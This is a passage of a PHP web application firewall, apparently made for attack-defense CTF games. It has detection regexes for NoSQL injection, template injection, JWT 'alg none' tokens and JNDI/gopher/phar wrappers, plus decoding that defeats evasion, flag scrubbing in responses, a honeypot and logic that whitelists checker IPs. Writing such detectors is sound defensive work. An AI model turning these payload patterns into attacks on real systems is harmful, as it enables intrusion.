        '/\\\\[0-7]{3}\\\\[0-7]{3}/',
        '/[a-zA-Z_](?:\/\*.*?\*\/)+[a-zA-Z_]/',
        '/(?:\$[a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff]*\s*\.\s*){2,}/',
        '/[\'"][a-zA-Z0-9_]+[\'"]\[\d+\]\s*\.\s*/',
        '/\$[a-zA-Z_\x7f-\xff]\w*\[[^\]]+\]\s*\(/',
    ],

        'nosqli' => [
        '/\[\s*\$(?:ne|eq|gt|gte|lt|lte|in|nin|regex|where|exists|type|mod|all|elemMatch|not|or|and|nor|size|expr|function|slice|comment|meta|jsonSchema)\s*\]/i',
        '/[\'"]\s*\$(?:ne|gt|gte|lt|lte|regex|where|in|nin|exists|elemMatch|not|size|expr|function|all|mod|type|nor|accumulator)\s*[\'"]\s*:/i',
        '/\{\s*[\'"]?\$(?:where|function|expr|accumulator)[\'"]?\s*:/i',
        '/\$where\s*:\s*[\'"].*(?:sleep|return|this\.|function)/i',
        '/\{\s*[\'"]?\$(?:ne|gt|gte|lt|lte|not|size)[\'"]?\s*:\s*(?:\{|null|1|0|true|[\'"])/i',
        '/[\'";]\s{0,6};?\s{0,6}return\s+(?:this|db)\s*[.\[]/i',         // $where JS 注入 (';return this.pw)。定界符必需 + 有界空白，防 ReDoS
    ],

        'ssti' => [
        '/\{\{\s*[\d\s]*[\*\+\-\/%]{1,2}\s*[\d\s]*\}\}/',                       '/\{\{[\s\S]{0,90}(?:_self|_context|__class__|__globals__|__mro__|__subclasses__|__builtins__|__import__|__init__|__base__|__dict__)/i',
        '/\{\{[\s\S]{0,90}(?:config|request|self|cycler|joiner|namespace|lipsum|get_flashed_messages|settings|session|secret_key|url_for|current_app|\bapp\b|\bg\b)\b/i',
        '/\{%\s*(?:if|for|set|include|import|extends|with|filter|debug|do)\s+[^\s%]/i',
        '/\{php\}.{0,80}\{\/php\}/is',                                           '/\{\s*system\s*\(|\{\s*exec\s*\(/i',
        '/\$\{[^}]{0,80}(?:T\(|Runtime|ProcessBuilder|freemarker|Execute)/i',         '/#\{.{0,80}(?:@|Kernel|system|exec)/i',                                '/<%=?.{0,80}(?:system|exec|Runtime|IO\.popen|`)/i',                            '/\|\s*(?:filter|map|sort|reduce)\s*\(\s*[\'"](?:system|exec|passthru|shell_exec|popen|proc_open|assert|eval|id)\b/i',
                '/<#\s*(?:assign|list|import|macro|function|attempt|global)\b/i',
        '/freemarker\.template\.utility\.(?:Execute|ObjectConstructor)/i',
    ],

        'jwt' => [
        '/eyJ[A-Za-z0-9_\-]*(?:CJhbGciOiJ|Ihbgci|hbGciOiJub25l|hbGciOiJOb25l|hbGciOiJOT05F|hbGciOibm9uZ)/',         '/eyJ(?:hbGciOiJub25l|hbGci0iJub25l)/i',
        '/[\'"]alg[\'"]\s*:\s*[\'"](?:none|None|NONE|nOnE)[\'"]/i',
    ],

        'proto' => [
        '/(?:phar|zip|rar|ogg|compress\.zlib|compress\.bzip2)\s*:\s*\/\//i',
        '/php:\/\/filter\/[^,\s]*(?:convert\.iconv|convert\.base64|zlib\.|string\.)/i',
        '/(?:dict|gopher|tftp|ldap|jar|netdoc|mailto):\s*\/\//i',
        '/ssh2\.(?:exec|shell|tunnel|sftp|scp)\s*:\s*\/\//i',                   '/jar:\s*(?:https?|ftp|file):/i',                                       '/\$\{jndi:/i',                                                         '/\$\{(?:[^}]{0,40}\$\{[^}]*:-|(?:lower|upper|env|sys|date|java|main|ctx):)/i',         '/\$\{jndi:(?:ldap|rmi|dns|iiop|corba|nis)/i',                          '/\bpearcmd\b|\bpear\/pearcmd/i',                                       '/session_upload_progress|PHP_SESSION_UPLOAD_PROGRESS/i',           ],
    ];

    foreach ($p as $key => $patterns) {
        $p[$key] = array_values(array_unique($patterns));
    }

    return $p;
}

// SECTION 2b: 低置信度规则注册表（置信度评分引擎，降低误报核心）
// 这些正则覆盖面广但也最易误报（如颜色值 0xFFFFFF、普通函数 char()/cast()、
// 需在同一请求中命中来自 >= score_threshold 个【不同信号组】的证据才拦截。
// 每条正则映射到一个"信号组": 描述同一底层特征的多条正则同组，只计一次，
// 避免"0xFF00AA 同时命中两条 hex 正则"这类假的双重证据造成误报。
function pwaf_lowconf() {
    static $s = null;
    if ($s !== null) return $s;
    $s = [
        // SQLi 中易误报的宽泛特征
        '/0x[0-9a-fA-F]{4,}/i'                                                          => 'sql_hexlit',
        '/\b0[xX][0-9a-fA-F]{4,}\b/'                                                    => 'sql_hexlit',
        '/\b0[bB][01]{8,}\b/'                                                           => 'sql_hexlit',
        '/\bchar\s*\(\s*\d+/i'                                                          => 'sql_func',
        '/\b(concat|group_concat|concat_ws|char|unhex|hex|ascii|ord|cast|convert)\s*\(/i' => 'sql_func',
        '/\b(and|or)\b\s+[\d\'"(]\s*[=<>!]/i'                                           => 'sql_bool',
        '/\border\s+by\s+\d+/i'                                                         => 'sql_order',
        '/\bif\s*\(\s*[\d\'"]/i'                                                        => 'sql_if',
        '/(?:[=<>!]|[\s\S]\b(?:and|or|xor)\b)[\s\S]{0,20}\b(rlike|regexp|sounds\s+like|like)\b/i' => 'sql_like',
        // XSS 中易误报的宽泛特征
        '/\bon\w+\s*=/i'                                                                => 'xss_on',
        '/\bon[a-zA-Z]{3,20}[\s\n]*=/i'                                                 => 'xss_on',
        '/\{\{.{0,100}\}\}/'                                                            => 'tmpl_brace',
        '/\{%.{0,100}%\}/'                                                              => 'tmpl_brace',
        '/\b(?:srcdoc|formaction|autofocus|ping)\s*=/i'                                 => 'xss_attr',
        '/\b(?:v-bind|v-html|ng-app|ng-bind|@click)\s*=/i'                              => 'xss_fw',
                '/data\s*:\s*text\/(?:html|xml)/i'                                             => 'proto_datauri',
    ];
    return $s;
}

// SECTION 3: ANTI-BYPASS DECODE PIPELINE

function pwaf_decode($v) {
    $seen = []; $queue = [$v]; $out = [];
    $max  = 25;
    while (!empty($queue) && $max-- > 0) {
        $cur = array_shift($queue);
        $k   = md5($cur);
        if (isset($seen[$k])) continue;
        $seen[$k] = true;
        $out[]    = $cur;
        foreach (pwaf_decode_once($cur) as $d) {
            if (!isset($seen[md5($d)])) $queue[] = $d;
        }
    }
        $extra = [];
    foreach ($out as $r) {
        $n = pwaf_norm($r);
        $extra[] = $n;
        $extra[] = strtolower($n);
        // MySQL 版本注释绕过: /*!50000UNION*//*!SELECT*/ — MySQL 会执行注释内容。
                // "版本注释包裹并粘连关键字"需另加变体: 去壳保留内容并用空格分隔关键字。
        if (strpos($r, '/*') !== false) {
                        $vc = preg_replace('/\/\*!(?:\d{1,6})?(.*?)\*\//s', ' $1 ', $r);
            $vc = preg_replace('/\s{2,}/', ' ', $vc);
            if ($vc !== $r) { $extra[] = $vc; $extra[] = strtolower($vc); }
                        $vg = preg_replace('/\/\*!?(?:\d{1,6})?(.*?)\*\//s', '$1', $r);
            if ($vg !== $r && $vg !== $vc) { $extra[] = $vg; $extra[] = strtolower($vg); }
        }
    }
    return array_unique(array_merge($out, $extra));
}

function pwaf_decode_once($v) {
    $out = [];

        $d = urldecode($v);
    if ($d !== $v) $out[] = $d;
    $d2 = urldecode($d);
    if ($d2 !== $d) $out[] = $d2;

        $he = html_entity_decode($v, ENT_QUOTES | ENT_HTML5, 'UTF-8');
    if ($he !== $v) $out[] = $he;

    // \xNN hex escapes
    $hx = preg_replace_callback('/\\\\x([0-9a-fA-F]{2})/i', function($m) {
        return chr(hexdec($m[1]));
    }, $v);
    if ($hx !== $v) $out[] = $hx;

        $oc = preg_replace_callback('/\\\\([0-7]{1,3})/', function($m) {
        return chr(octdec($m[1]));
    }, $v);
    if ($oc !== $v) $out[] = $oc;

        $un = preg_replace_callback('/\\\\u([0-9a-fA-F]{4})/i', function($m) {
        return pwaf_cp2utf8(hexdec($m[1]));
    }, $v);
    if ($un !== $v) $out[] = $un;

        $pu = preg_replace_callback('/%u([0-9a-fA-F]{4})/i', function($m) {
        return pwaf_cp2utf8(hexdec($m[1]));
    }, $v);
    if ($pu !== $v) $out[] = $pu;

    // Base64 sniff (含 base64url，容忍缺失填充，阈值下调以覆盖短 webshell/序列化载荷)
    $t = trim($v);
    if (strlen($t) >= 12 && preg_match('/^[A-Za-z0-9+\/_-]+={0,2}$/', $t)) {
        $b64 = strtr($t, '-_', '+/');
        $pad = strlen($b64) % 4;
        if ($pad) $b64 .= str_repeat('=', 4 - $pad);
        $b = base64_decode($b64, true);
        if ($b !== false && $b !== '' && mb_check_encoding($b, 'UTF-8')) $out[] = $b;
    }

        $fw = preg_replace_callback('/[\xEF][\xBC-\xBD][\x80-\xBF]/', function($m) {
        $cp = pwaf_mb_ord($m[0]);
        return ($cp >= 0xFF01 && $cp <= 0xFF5E) ? chr($cp - 0xFEE0) : $m[0];
    }, $v);
    if ($fw !== $v) $out[] = $fw;

        $nb = str_replace("\x00", '', $v);
    if ($nb !== $v) $out[] = $nb;

    // 0xNN hex in SQL context (如 0x666c6167 → "flag")
    // 仅当解码结果为合法 UTF-8 文本时才纳入检测，避免把颜色值/哈希等无意义 hex
    // (如 0xFF00AA → \xFF\x00\xAA) 解成含 null 字节的字节串，误触发 LFI null 规则。
    $mh = preg_replace_callback('/0x([0-9a-fA-F]{2,})/i', function($m) {
        $h = $m[1];
        if (strlen($h) % 2 !== 0) $h = '0' . $h;
        $r = '';
        for ($i = 0; $i < strlen($h); $i += 2) $r .= chr(hexdec(substr($h, $i, 2)));
        return $r;
    }, $v);
    if ($mh !== $v && mb_check_encoding($mh, 'UTF-8') && strpos($mh, "\x00") === false) $out[] = $mh;

        // 函数名绕过特征匹配；去掉字母/括号前的反斜杠后交由 cmdi/code 规则精确命中。
    if (strpos($v, '\\') !== false) {
        $bs = preg_replace('/\\\\([a-zA-Z(])/', '$1', $v);
        if ($bs !== $v) $out[] = $bs;
    }

        // 剥离引号，攻击者借此打断命令关键字绕过匹配；去引号后交由 cmdi 规则命中。
    if (strpos($v, "'") !== false || strpos($v, '"') !== false) {
        $dq = str_replace(array("'", '"'), '', $v);
        if ($dq !== $v && $dq !== '') $out[] = $dq;
    }

        if (strpos($v, '/./') !== false) {
        $pc = $v; $prev = null;
        while ($pc !== $prev) { $prev = $pc; $pc = str_replace('/./', '/', $pc); }
        if ($pc !== $v) $out[] = $pc;
    }

    // JWT 头解码: JWT 结构 (e<b64>.<b64>) 的第一段 base64 即 {"...} 头部。
    // base64('{') 恒以 'e' 开头，第二字符随 { 后空白字节变化 (ey/ew...)；
        if (preg_match('/^e[A-Za-z0-9_\-]{7,}\.[A-Za-z0-9_\-]{4,}/', $v)) {
        $seg = $v;
        $dot = strpos($seg, '.');
        if ($dot !== false) $seg = substr($seg, 0, $dot);
        if (strlen($seg) >= 8 && strlen($seg) <= 512) {
            $seg = strtr($seg, '-_', '+/');
            $pad = strlen($seg) % 4;
            if ($pad) $seg .= str_repeat('=', 4 - $pad);
            $jd = base64_decode($seg, true);
            if ($jd !== false && isset($jd[0]) && $jd[0] === '{') $out[] = $jd;
        }
    }

        $rot = str_rot13($v);
    if ($rot !== $v && preg_match('/[a-zA-Z]/', $v)) $out[] = $rot;

        if (strlen($v) > 10) {
        foreach (['gzinflate', 'gzdecode', 'gzuncompress'] as $fn) {
            $gz = @$fn($v);
            if ($gz !== false && $gz !== $v && mb_check_encoding($gz, 'UTF-8')) $out[] = $gz;
        }
    }

    return $out;
}

function pwaf_norm($v) {
    $v = preg_replace('/\/\*!?.*?\*\//s', '', $v);       $v = preg_replace('/--[^\n\r]*/', ' ', $v);
    $v = preg_replace('/#[^\n\r]*/', ' ', $v);
    $v = preg_replace('/[\t\r\n\x0b\x0c\xa0\x00]+/', ' ', $v);
    $v = preg_replace('/\s{2,}/', ' ', $v);
    return trim($v);
}

function pwaf_cp2utf8($cp) {
    if (function_exists('mb_chr')) return mb_chr($cp, 'UTF-8');
    if ($cp < 0x80)    return chr($cp);
    if ($cp < 0x800)   return chr(0xC0|($cp>>6))  . chr(0x80|($cp&0x3F));
    if ($cp < 0x10000) return chr(0xE0|($cp>>12)) . chr(0x80|(($cp>>6)&0x3F))  . chr(0x80|($cp&0x3F));
    return chr(0xF0|($cp>>18)) . chr(0x80|(($cp>>12)&0x3F)) . chr(0x80|(($cp>>6)&0x3F)) . chr(0x80|($cp&0x3F));
}

function pwaf_mb_ord($c) {
    if (function_exists('mb_ord')) return mb_ord($c, 'UTF-8');
    $b = array_values(unpack('C*', $c));
    if (count($b) === 1) return $b[0];
    if (count($b) === 2) return (($b[0]&0x1F)<<6)|($b[1]&0x3F);
    if (count($b) === 3) return (($b[0]&0x0F)<<12)|(($b[1]&0x3F)<<6)|($b[2]&0x3F);
    return (($b[0]&0x07)<<18)|(($b[1]&0x3F)<<12)|(($b[2]&0x3F)<<6)|($b[3]&0x3F);
}

// SECTION 4: INPUT COLLECTION

function pwaf_inputs() {
    $inputs = [];

    $flat = function(array $arr, $src, $pfx = '') use (&$inputs, &$flat) {
        foreach ($arr as $k => $v) {
            $key = $pfx ? "{$pfx}[{$k}]" : (string)$k;
                                    if (strpos($key, '$') !== false) {
                $inputs[] = ['src' => $src . '_KEY', 'key' => $key, 'val' => $key];
            }
            if (is_array($v)) { $flat($v, $src, $key); }
            else { $inputs[] = ['src' => $src, 'key' => $key, 'val' => (string)$v]; }
        }
    };

    $flat($GLOBALS['_PWAF_GET'],    'GET');
    $flat($GLOBALS['_PWAF_POST'],   'POST');
    $flat($GLOBALS['_PWAF_COOKIE'], 'COOKIE');

        foreach (array_keys($GLOBALS['_PWAF_GET'])  as $k) $inputs[] = ['src'=>'GET_KEY',  'key'=>'_k', 'val'=>(string)$k];
    foreach (array_keys($GLOBALS['_PWAF_POST']) as $k) $inputs[] = ['src'=>'POST_KEY', 'key'=>'_k', 'val'=>(string)$k];

    // Dangerous headers — Referer 只检测 XSS/cmdi/lfi/code，不检测 SSRF（Referer 本身可以是本站地址）
    foreach (['HTTP_USER_AGENT','HTTP_X_FORWARDED_FOR','HTTP_X_REAL_IP',
              'HTTP_CF_CONNECTING_IP','HTTP_X_FORWARDED_HOST','HTTP_X_ORIGINAL_URL',
              'HTTP_X_REWRITE_URL','HTTP_VIA','HTTP_FORWARDED'] as $h) {
        if (!empty($GLOBALS['_PWAF_SERVER'][$h])) $inputs[] = ['src'=>'HDR', 'key'=>$h, 'val'=>$GLOBALS['_PWAF_SERVER'][$h], 'no_ssrf'=>false];
    }
        if (!empty($GLOBALS['_PWAF_SERVER']['HTTP_REFERER'])) {
        $inputs[] = ['src'=>'HDR', 'key'=>'HTTP_REFERER', 'val'=>$GLOBALS['_PWAF_SERVER']['HTTP_REFERER'], 'no_ssrf'=>true];
    }

    // Raw body（使用早期缓存的 _PWAF_RAW_BODY，避免重复读取 php://input）
    $raw = (isset($GLOBALS['_PWAF_RAW_BODY']) ? $GLOBALS['_PWAF_RAW_BODY'] : (string)@file_get_contents('php://input'));
    if ($raw !== '') {
        $ct = strtolower((isset($GLOBALS['_PWAF_SERVER']['CONTENT_TYPE']) ? $GLOBALS['_PWAF_SERVER']['CONTENT_TYPE'] : ''));
        if (strpos($ct, 'application/json') !== false) {
            $j = json_decode($raw, true);
            if (is_array($j)) $flat($j, 'JSON');
        }
        if (strpos($ct, 'xml') !== false || preg_match('/^\s*<\?xml/i', $raw)) {
            $inputs[] = ['src'=>'XML', 'key'=>'raw', 'val'=>$raw];
        }
        $inputs[] = ['src'=>'BODY', 'key'=>'raw', 'val'=>$raw];
    }

        foreach ($GLOBALS['_PWAF_FILES'] as $field => $f) {
        $tmps  = is_array($f['tmp_name']) ? $f['tmp_name'] : [$f['tmp_name']];
        $names = is_array($f['name'])     ? $f['name']     : [$f['name']];
        foreach ($tmps as $i => $tmp) {
            if (!$tmp || !is_uploaded_file($tmp)) continue;
            $inputs[] = ['src'=>'FILE_NAME',    'key'=>$field, 'val'=>(string)((isset($names[$i]) ? $names[$i] : ''))];
            $content  = @file_get_contents($tmp, false, null, 0, 8192);
            if ($content !== false) $inputs[] = ['src'=>'FILE_BODY', 'key'=>$field, 'val'=>$content];
        }
    }

        $cg = implode(' ', array_map('strval', array_values($GLOBALS['_PWAF_GET'])));
    $cp = implode(' ', array_map('strval', array_values($GLOBALS['_PWAF_POST'])));
    if ($cg) $inputs[] = ['src'=>'CGET',  'key'=>'_c', 'val'=>$cg];
    if ($cp) $inputs[] = ['src'=>'CPOST', 'key'=>'_c', 'val'=>$cp];

    return $inputs;
}

// SECTION 5: CORE ENGINE

// ── L1 扫描决策（纯函数，可独立单元测试）──────────────────────────────────────
// 置信度评分: 高危规则秒杀; 低置信规则在 balanced 模式下需累计 score_threshold 次
// 独立证据（不同正则）方才拦截，从根本上降低对正常业务的误报。
function pwaf_scan_inputs(array $inputs, array $cfg) {
    $rules    = $cfg['rules'];
    $patterns = pwaf_patterns();
    $lowconf  = pwaf_lowconf();

    // 防护强度: balanced(低误报) / strict(传统一击拦截) / paranoid(零漏报)
    $mode = (isset($cfg['fp_mode']) ? $cfg['fp_mode'] : 'balanced');
    $lc_threshold = ($mode === 'balanced')
        ? max(2, (int)(isset($cfg['score_threshold']) ? $cfg['score_threshold'] : 2))
        : 1;                                      $paranoid = ($mode === 'paranoid');
        $comb_rules = $paranoid
        ? ['sqli','cmdi','unserialize','code','nosqli','ssti']
        : ['sqli','cmdi','unserialize'];

    foreach ($inputs as $inp) {
        $src = $inp['src']; $key2 = $inp['key']; $val = $inp['val'];
        $no_ssrf = !empty($inp['no_ssrf']);
        if ($val === '') continue;

        // 低置信度评分按【单个输入】累计，不跨参数累加：否则两个各含一个低置信
        // 特征的正常参数(如 0xFF8800 颜色 + {{name}} 模板)会被错误叠加到阈值而误报。
        // 拆分投递的真实载荷由 CGET/CPOST 合并输入的高置信规则覆盖。
        $lc_score = 0; $lc_seen = []; $lc_first = null;

        $is_file = ($src === 'FILE_BODY' || $src === 'FILE_NAME');
        $is_comb = ($src === 'CGET' || $src === 'CPOST');

        // ── ReDoS 防护 + 抗前置填充绕过 ────────────────────────────────────
        // 超长输入不整体回溯（防 ReDoS），但只扫前 2048 字节会被"前面塞几KB垃圾、
        // 真载荷放末尾"绕过。故对超长输入同时扫描头部与尾部两个窗口。
        $len = strlen($val);
        if ($len <= 8192) {
            $val_check = $val;                                    // 完整扫描（模式均有界，无 ReDoS 风险）
        } else {
            // 超长: 扫描 头/中/尾 三窗口，封堵"前置填充把载荷推出扫描窗口"绕过
            $val_check = substr($val, 0, 3072) . "\n"
                       . substr($val, (int)(($len - 2048) / 2), 2048) . "\n"
                       . substr($val, -3072);
        }

        $versions = pwaf_decode($val_check);

        foreach ($versions as $dv) {
            foreach ($patterns as $rule => $pats) {
                if (empty($rules[$rule])) continue;
                if ($rule === 'upload' && !$is_file) continue;
                if ($no_ssrf && $rule === 'ssrf') continue;                                   // 跳过 LFI(null 字节)/SQLi 等——否则正常图片/PDF/ZIP 上传里的二进制
                                if ($src === 'FILE_BODY'
                    && !in_array($rule, ['upload','code','cmdi','bypass','proto'], true)) continue;
                                if ($is_comb && !in_array($rule, $comb_rules, true)) continue;

                foreach ($pats as $pat) {
                    // PHP 标签在 code 规则中仅对上传文件生效（避免正常代码框误报）
                    if ($rule === 'code' && !$is_file
                        && ($pat === '/<\?php/i' || $pat === '/<\?=/i')) continue;
                    if (@preg_match($pat, $dv)) {
                        // 低置信度规则: 按【信号组】累计评分，达到阈值才拦截。
                        // 同一信号组（如多条 hex 正则）只计一次，杜绝假的双重证据。
                        if (isset($lowconf[$pat])) {
                            $grp = $lowconf[$pat];
                            if (!isset($lc_seen[$grp])) {
                                $lc_seen[$grp] = true;
                                $lc_score++;
                                if ($lc_first === null) {
                                    $lc_first = ['rule'=>$rule.'_score', 'param'=>"{$src}:{$key2}", 'payload'=>$dv];
                                }
                                if ($lc_score >= $lc_threshold) return $lc_first;
                            }
                            continue;   // 单次低置信命中，继续扫描寻找更多证据
                        }
                        // 高置信度规则: 秒杀拦截
                        return ['rule'=>$rule, 'param'=>"{$src}:{$key2}", 'payload'=>$dv];
                    }
                }
            }
        }
    }

        if (!empty($cfg['custom_rules'])) {
        foreach ($cfg['custom_rules'] as $rname => $rcfg) {
            if (empty($rcfg['enabled'])) continue;
            $scope = (isset($rcfg['scope']) ? $rcfg['scope'] : 'all');
            $pat   = $rcfg['pat'];
            foreach ($inputs as $inp) {
                if ($scope !== 'all' && strtolower($inp['src']) !== strtolower($scope)) continue;
                foreach (pwaf_decode($inp['val']) as $dv) {
                    if (@preg_match($pat, $dv)) {
                        return ['rule'=>'custom:' . $rname, 'param'=>$inp['src'].':'.$inp['key'], 'payload'=>$dv];
                    }
                }
            }
        }
    }

    return null;
}

function pwaf_run() {
    // ── 超全局变量快照（防篡改）──────────────────────────────────────────
    // 在 WAF 入口立即冻结，后续全部读快照，防止攻击者通过代码层面污染
    $GLOBALS['_PWAF_GET']    = $_GET;
    $GLOBALS['_PWAF_POST']   = $_POST;
    $GLOBALS['_PWAF_COOKIE'] = $_COOKIE;
    $GLOBALS['_PWAF_FILES']  = $_FILES;
    $GLOBALS['_PWAF_SERVER'] = $_SERVER;

    $cfg = &pwaf_cfg();
    if (empty($cfg['enabled'])) return;

    $t0 = microtime(true);
    $ip = pwaf_ip();

            $ct = strtolower((isset($GLOBALS['_PWAF_SERVER']['CONTENT_TYPE']) ? $GLOBALS['_PWAF_SERVER']['CONTENT_TYPE'] : ''));
    if (strpos($ct, 'multipart/form-data') !== false) {
                $parts = [];
        foreach ($GLOBALS['_PWAF_POST'] as $k => $v) {
            if (is_array($v)) { foreach ($v as $sv) $parts[] = urlencode($k) . '[]=' . urlencode((string)$sv); }
            else $parts[] = urlencode($k) . '=' . urlencode((string)$v);
        }
        foreach ($GLOBALS['_PWAF_FILES'] as $field => $f) {
            $names = is_array($f['name']) ? $f['name'] : [$f['name']];
            $tmps  = is_array($f['tmp_name']) ? $f['tmp_name'] : [$f['tmp_name']];
            foreach ($tmps as $i => $tmp) {
                if ($tmp && is_uploaded_file($tmp)) {
                    $parts[] = urlencode($field) . '=' . urlencode('[FILE:' . ((isset($names[$i]) ? $names[$i] : 'unknown')) . ']');
                }
            }
        }
        $GLOBALS['_PWAF_RAW_BODY'] = implode('&', $parts);
    } else {
        $GLOBALS['_PWAF_RAW_BODY'] = (string)@file_get_contents('php://input');
    }

        if (!empty($cfg['open_basedir'])) {
        @ini_set('open_basedir', $cfg['open_basedir'] . PATH_SEPARATOR . '/tmp/' . PATH_SEPARATOR . sys_get_temp_dir());
    }

    // ── LD_PRELOAD 保护（自动设置）─────────────────────────────────────────
    if (!empty($cfg['ldpreload_enabled']) && !empty($cfg['ldpreload_path']) && file_exists($cfg['ldpreload_path'])) {
        @putenv('LD_PRELOAD=' . $cfg['ldpreload_path']);
    }

        $key = (isset($GLOBALS['_PWAF_GET']['waf_key']) ? $GLOBALS['_PWAF_GET']['waf_key'] : (isset($GLOBALS['_PWAF_POST']['waf_key']) ? $GLOBALS['_PWAF_POST']['waf_key'] : ''));
    if ($key !== '' && !empty($cfg['key']) && hash_equals($cfg['key'], $key)) {
        pwaf_panel($cfg, $ip); exit;
    }

        pwaf_checker_detect($cfg, $ip);

        if (in_array($ip, $cfg['whitelist'], true)) {
        pwaf_access_log($cfg, $ip, 'pass', 'whitelist', $t0); return;
    }
    if (in_array($ip, $cfg['checker_ips'], true)) {
        pwaf_access_log($cfg, $ip, 'pass', 'checker', $t0); return;
    }

        if (in_array($ip, $cfg['blacklist'], true)) {
        pwaf_block($cfg, $ip, 'blacklist', 'ip', $ip, $t0); return;
    }

        if (pwaf_rate_check($cfg, $ip)) {
        pwaf_block($cfg, $ip, 'rate_limit', 'ip', $ip, $t0); return;
    }

        $uri = parse_url((isset($GLOBALS['_PWAF_SERVER']['REQUEST_URI']) ? $GLOBALS['_PWAF_SERVER']['REQUEST_URI'] : '/'), PHP_URL_PATH) ?: '/';
    foreach ($cfg['honeypots'] as $hp) {
        if ($uri === $hp || strpos($uri, $hp) === 0) {
            pwaf_log($cfg, $ip, 'honeypot', 'uri', $uri, 'honeypot');
            pwaf_auto_ban($cfg, $ip);
            header('Content-Type: text/plain');
            echo $cfg['fake_flag'];
            exit;
        }
    }

    // ── 静态资源快速放行（零误报 + 提速）──────────────────────────────────────
        // 不可能承载有效攻击载荷，却是正常业务的大头，是误报与性能开销的主要来源。
    if (!empty($cfg['static_bypass']) && pwaf_is_static($uri)) {
        pwaf_access_log($cfg, $ip, 'pass', 'static', $t0);
        return;
    }

    // ── L1: Request WAF（置信度评分引擎）──────────────────────────────────────
    $inputs = pwaf_inputs();
    $rules  = $cfg['rules'];
    $hit = pwaf_scan_inputs($inputs, $cfg);
    if ($hit !== null) {
        pwaf_block($cfg, $ip, $hit['rule'], $hit['param'], $hit['payload'], $t0);
        return;
    }

        if (!empty($rules['response'])) {
        $GLOBALS['_PWAF_OB_FLUSHED'] = false;
        ob_start(function($out) use (&$cfg, $ip) {
            $GLOBALS['_PWAF_OB_FLUSHED'] = true;
            return pwaf_response_hook($out, $cfg, $ip);
        });
        $GLOBALS['_PWAF_OB_LEVEL'] = ob_get_level();

                register_shutdown_function(function() use (&$cfg, $ip) {
                        // ob_start 只能截获 body，header() 注入的 Flag 会漏杀
            if (function_exists('headers_list')) {
                $default_regex = '(?:flag|ctf)\\{[A-Za-z0-9_\\-\\.!@#$%^&*()+=]{1,100}\\}';
                $fp = !empty($cfg['flagsub_regex'])
                    ? '/' . str_replace('/', '\\/', $cfg['flagsub_regex']) . '/'
                    : '/' . $default_regex . '/i';

                $fake = (isset($cfg['fake_flag']) ? $cfg['fake_flag'] : 'flag{fake}');
                foreach (headers_list() as $hdr) {
                    if (preg_match($fp, $hdr, $hm)) {
                        pwaf_auto_submit_flag($hm[0], $cfg);
                        pwaf_log($cfg, $ip, 'flag_leak_header', 'response_header', substr($hdr, 0, 200), 'replaced');
                                                $colon_pos = strpos($hdr, ':');
                        if ($colon_pos !== false) {
                            $hdr_name = substr($hdr, 0, $colon_pos);
                            $hdr_val  = substr($hdr, $colon_pos + 1);
                            $safe_val = preg_replace($fp, pwaf_same_length_fake($hm[0], $fake), $hdr_val);
                            header($hdr_name . ':' . $safe_val, true);
                        }
                    }
                }
            }

            if (!empty($GLOBALS['_PWAF_OB_FLUSHED'])) return;
                        $out = '';
            while (ob_get_level() > 0) {
                $out = ob_get_clean() . $out;
            }
            if ($out !== '') {
                echo pwaf_response_hook($out, $cfg, $ip);
            }
        });
    }

        // 必须在 L2 响应钩子【之后】注册：pwaf_forward 的 shutdown 会 fastcgi_finish_request
    // 把响应交还客户端，若排在响应钩子的 shutdown 之前，会在"响应头 flag 擦除"执行前
    // 就把响应发出去，导致 header 层 flag 漏杀。放到最后注册即最后执行，规避该问题。
    if (!empty($cfg['forward_enabled']) && !empty($cfg['forward_targets'])) {
        pwaf_forward($cfg);
    }

        pwaf_access_log($cfg, $ip, 'pass', '', $t0);

        // 每 5 秒检查一次（用时间戳文件避免并发重复执行）
        // JSON，两者格式不兼容会互相破坏（周期任务把 JSON 读成 (int)0 → 每次请求都跑完整性
        $tf = (isset($cfg['datadir']) ? $cfg['datadir'] : dirname(PWAF_SELF)) . '/.pwaf_tick';
    $last = (int)@file_get_contents($tf);
    if (time() - $last >= 5) {
        @file_put_contents($tf, time(), LOCK_EX);
                if (!empty($cfg['backup']) && file_exists($cfg['backup']) && !file_exists(PWAF_SELF)) {
            @copy($cfg['backup'], PWAF_SELF);
        }
                pwaf_integrity_check($cfg);
    }
}

// ── 静态资源判定（快速放行）──────────────────────────────────────────────────
function pwaf_is_static($uri) {
        $path = $uri;
    $q = strpos($path, '?'); if ($q !== false) $path = substr($path, 0, $q);
    if (!preg_match('/\.([a-z0-9]{1,6})$/i', $path, $m)) return false;
    static $exts = null;
    if ($exts === null) {
                // 刻意不含 txt/json/xml/pdf/zip 等：这些可能被 ForceType 路由为 PHP 并携带 flag，
        // 必须保留响应层 flag 擦除能力，绝不放行。
        $exts = array_flip([
            'css','js','mjs','scss','less',
            'png','jpg','jpeg','gif','webp','ico','bmp','avif','apng',
            'woff','woff2','ttf','eot','otf',
            'mp4','webm','ogv','mp3','wav','flac','m4a','aac','mov',
        ]);
    }
    return isset($exts[strtolower($m[1])]);
}

function pwaf_ip() {
            // 用它们做 IP 判断 = 频率限制/黑名单/裁判机识别全部失效
    $ip = (isset($GLOBALS['_PWAF_SERVER']['REMOTE_ADDR']) ? $GLOBALS['_PWAF_SERVER']['REMOTE_ADDR'] : '');
    if ($ip && filter_var($ip, FILTER_VALIDATE_IP)) return $ip;
    return '0.0.0.0';
}

// Heuristic: checker typically hits the same path repeatedly with clean requests
// We whitelist IPs that make requests with no suspicious params
function pwaf_checker_detect(array &$cfg, $ip) {
        if (in_array($ip, $cfg['checker_ips'], true)) return;
    if (in_array($ip, $cfg['blacklist'], true)) return;

    // Only consider IPs with no GET/POST params (checker usually hits root cleanly)
    if (!empty($GLOBALS['_PWAF_GET']) || !empty($GLOBALS['_PWAF_POST'])) return;

    $uri = (isset($GLOBALS['_PWAF_SERVER']['REQUEST_URI']) ? $GLOBALS['_PWAF_SERVER']['REQUEST_URI'] : '/');
        if (!preg_match('#^/(index\.php)?(\?.*)?$#', $uri)) return;

        $track_file = dirname(PWAF_SELF) . '/.pwaf_chk';
    $data = [];
    if (file_exists($track_file)) {
        $data = json_decode(@file_get_contents($track_file), true) ?: [];
    }
        $now = time();
    foreach ($data as $k => $v) {
        if ($now - ((isset($v['t']) ? $v['t'] : 0)) > 600) unset($data[$k]);
    }
    if (!isset($data[$ip])) {
        $data[$ip] = ['t' => $now, 'n' => 0];
    }
    $data[$ip]['n']++;

        if ($data[$ip]['n'] >= 3) {
        $cfg['checker_ips'][] = $ip;
        pwaf_save_cfg($cfg);
